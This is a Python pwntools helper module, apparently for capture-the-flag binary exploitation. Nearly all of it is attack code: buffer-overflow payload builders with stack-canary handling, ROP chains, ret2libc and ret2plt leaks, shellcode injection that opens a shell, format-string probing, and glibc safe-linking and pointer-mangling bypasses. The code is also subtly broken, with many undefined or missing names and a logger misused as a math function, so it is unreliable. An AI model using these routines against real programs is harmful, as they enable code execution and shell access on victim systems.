from pwn import log, context, cyclic, unpack, log
from io import *
import pwn
import re

class PwnContext:    
    def __init__(self, proc, elf, libc, binary, prefix, offset, canary):
        self.proc = proc
        self.elf = elf
        self.libc = libc
        self.binary = binary
        self.prefix = prefix
        self.offset = offset
        self.canary = canary
    
    def getb(self, d, a, b):
        a_ = d.find(a)
        if a_ == -1 or a == b"": a_ = 0
        b_ = d.find(b, a_+len(a))
        if b_ == -1 or b == b"": b_ = len(d)
        return d[a_+len(a):b_]

    def getr(self, d, p):
        return re.findall(p, d)[0]
        
    def safelink_bf64(self, ptr):
        fd = 0
        for i in range(36, -1, -12):
            tmp = fd
            fd <<= 12
            fd |= (tmp ^ (ptr >> i)) & 0xfff
        if fd & 0xf != 0:
            log.warn("safelink bf page differs")
        return fd

    def printx(self, **kwargs):
        for k, v in kwargs.items():
            log.success("%s: %#x" % (k, v))  

    def resolve(self, symbol, base=None):
        """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
        if base is None:
            base = self.elf
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, offset = symbol.split("+")
            addr = base.sym[func] + int(offset, 0)
        elif "-" in symbol:
            func, offset = symbol.split("-")
            addr = base.sym[func] - int(offset, 0)
        else:
            addr = base.sym[symbol]
        return addr

    def hexdump(self, data, s=context.word_size//8):
        idx_max = ceil(log(len(data)/s, 16))
        for i, c in enumerate(sliced(data, s)):
            log.info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(c)))
    
    def leak(self, leak, leaked=0):
        start = leak.find(b'0x')
        end = 2
        if start > 0:
            leak = leak[start:]
            for i in leak[2:]:
                try: int(chr(i), 16); end += 1
                except: break
            leak = leak[:end]
            leak = int(leak, 16)
        else:
            len = context.bits//8
            leak = leak.ljust(len, b'\x00')[:len]
            leak = unpack(leak, context.bits)

        leak -= leaked
        self.check_leaks(leak)
        return leak

    
    def check_leaks(self, leak):
        for m in self.proc.maps():
            if m.start <= leak <= m.end:
                base = 0
                
                if self.elf.path == m.path:
                    name = "elf"
                    base = self.proc.elf_mapping().address
                elif self.libc.path == m.path:
                    name = "libc"
                    base = self.proc.libc_mapping().address
                else:
                    name = m.path[1:-1]
                    base = getattr(self.proc, f'{name}_mapping')().address

                if base > 0 and leak != base:
                    log.info(f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}")
                    if getattr(self, name, False): getattr(self, name).address = base
                else:
                    log.info(f"{name}: leak = {leak:#x}")



    def ropchain(self, chain, ret=True, elf=None, libc=None):
        """Build a ROP chain from a dictionary of {function: [args]}"""
        elf = elf or self.elf
        libc = libc or self.libc

        elfs = []
        if elf and (not elf.pie or elf.address):
            elfs.append(elf)
        if libc and (not libc.aslr or libc.address):
            elfs.append(libc)
        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)
        for func, params in chain.items():
            if '+' in func:
                f = func.split('+')
                func = resolve(f[0])+int(f[1])
            if type(params) != dict:
                rop.call(func, params)
            else:
                for value, name in rop.setRegisters(params):
                    if type(name) == pwnlib.rop.gadgets.Gadget:
                        rop.raw(name)
                    else:
                        rop.raw(value)
                rop.call(func)

        rop.raw(rop.ret.address)
        info(f"ROP :\n{rop.dump()}")
        return rop.chain()


    def find_offset(self, data=cyclic(1000)):
        context.delete_corefiles = True
        self.proc = process(self.binary)
        send(data)
        self.proc.wait()
        core = self.proc.corefile
        self.offset = cyclic_find(core.fault_addr)
        self.proc.close()
        self.proc = None
        info(f"{self.offset = }")

    def bof(self, data, **kwargs):
        if self.offset is None:
            self.find_offset()
        opt = kwargs.pop("opt", {})
        bp = kwargs.pop("bp", 0)
        opt |= {self.offset - context.bytes: bp}
        if self.elf.canary:
            opt |= {self.offset - context.bytes * 2: self.canary}
        payload = flat({self.offset: data} | opt, **kwargs)
        self.send(payload)

    def ret2shellcode(self, addr, **kwargs):
        shellcode = asm(shellcraft.sh())
        if context.bits == 32:
            shellcode = asm("sub esp, 0x1000") + shellcode
        else:
            shellcode = asm("sub rsp, 0x1000") + shellcode
        padding = asm("nop") * (self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode))
        addr += len(padding) // 2
        payload = self.ropchain({addr: []})
        self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=[], **kwargs):
        addr = self.resolve(win)
        payload = self.ropchain({addr: params})
        self.bof(payload, **kwargs)

    def ret2libc(self, **kwargs):
        system = self.libc.sym["system"]
        bin_sh = next(self.libc.search(b"/bin/sh\x00"))
        payload = self.ropchain({system: [bin_sh]})
        self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", **kwargs):
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main: []})
        else:
            payload = self.ropchain({func_plt: [func_got]})
        self.bof(payload, **kwargs)
        leak = upack(self.recv())
        self.libc.address = leak - self.libc.sym[func]

    def format_string(self, n=100):
        payload = "A" * context.bytes + ".%p" * n
        self.send(payload)
        output = self.recv().split(".")
        info(f"format string : {output}")
        return output.index("0x" + "41" * context.bytes)

    def safelink(self, addr, ptr):
        return (addr >> 12) ^ ptr

    def ptr_mangle(self, addr, cookie=0):
        return rol(addr ^ cookie, 17)

    def ptr_demangle(self, addr, cookie=0):
        return ror(addr, 17) ^ cookie

    def ptr_cookie(self, mangled, demangled):
        return self.ptr_demangle(mangled, demangled)

    def binsh(self):
        return next(self.libc.search(b"/bin/sh\0"))

# Global instance
pwnctx = None

def set_ctx(new_ctx: PwnContext):
    global pwnctx
    pwnctx = new_ctx

def _require_ctx():
    if pwnctx is None:
        raise RuntimeError("PwnContext not initialized (call set_ctx first)")

getb = lambda *a, **k: (_require_ctx(), pwnctx.getb(*a, **k))[1]
getr = lambda *a, **k: (_require_ctx(), pwnctx.getr(*a, **k))[1]

safelink_bf64 = lambda *a, **k: (_require_ctx(), pwnctx.safelink_bf64(*a, **k))[1]
printx = lambda *a, **k: (_require_ctx(), pwnctx.printx(*a, **k))[1]
hexdump = lambda *a, **k: (_require_ctx(), pwnctx.hexdump(*a, **k))[1]

leak = lambda *a, **k: (_require_ctx(), pwnctx.leak(*a, **k))[1]
resolve = lambda *a, **k: (_require_ctx(), pwnctx.resolve(*a, **k))[1]
check_leaks = lambda *a, **k: (_require_ctx(), pwnctx.check_leaks(*a, **k))[1]

ropchain = lambda *a, **k: (_require_ctx(), pwnctx.ropchain(*a, **k))[1]
find_offset = lambda *a, **k: (_require_ctx(), pwnctx.find_offset(*a, **k))[1]
bof = lambda *a, **k: (_require_ctx(), pwnctx.bof(*a, **k))[1]

ret2shellcode = lambda *a, **k: (_require_ctx(), pwnctx.ret2shellcode(*a, **k))[1]
ret2win = lambda *a, **k: (_require_ctx(), pwnctx.ret2win(*a, **k))[1]
ret2libc = lambda *a, **k: (_require_ctx(), pwnctx.ret2libc(*a, **k))[1]
ret2plt = lambda *a, **k: (_require_ctx(), pwnctx.ret2plt(*a, **k))[1]

format_string = lambda *a, **k: (_require_ctx(), pwnctx.format_string(*a, **k))[1]

safelink = lambda *a, **k: (_require_ctx(), pwnctx.safelink(*a, **k))[1]
ptr_mangle = lambda *a, **k: (_require_ctx(), pwnctx.ptr_mangle(*a, **k))[1]
ptr_demangle = lambda *a, **k: (_require_ctx(), pwnctx.ptr_demangle(*a, **k))[1]
ptr_cookie = lambda *a, **k: (_require_ctx(), pwnctx.ptr_cookie(*a, **k))[1]

binsh = lambda *a, **k: (_require_ctx(), pwnctx.binsh(*a, **k))[1]

# Utility functions
u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
upack = lambda d: pwn.unpack(d, "all")
